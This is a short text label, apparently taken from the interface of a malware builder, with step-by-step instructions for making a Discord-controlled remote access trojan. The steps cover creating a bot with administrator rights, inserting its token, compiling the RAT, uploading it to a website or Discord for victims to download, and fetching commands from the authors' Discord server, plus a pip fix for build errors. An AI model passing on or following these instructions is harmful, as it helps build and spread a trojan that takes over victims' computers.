data.name: label41.Text
data.value:
1. Create discord bot, add it to your server (with administrator privileges). 2. Install python3. 3. Click install button. 4. Insert discord bot token and press Insert button. 5. Click compile rat button. 6. Upload compiled rat to website/discord < AppData/Discord AIO >. 7. Provide url of compiled rat into. 8. Check Discord RAT in additional page.
Commands are on our discord server. If you cannot compile RAT, uninstall enum34 package with <py -m pip uninstall enum34>
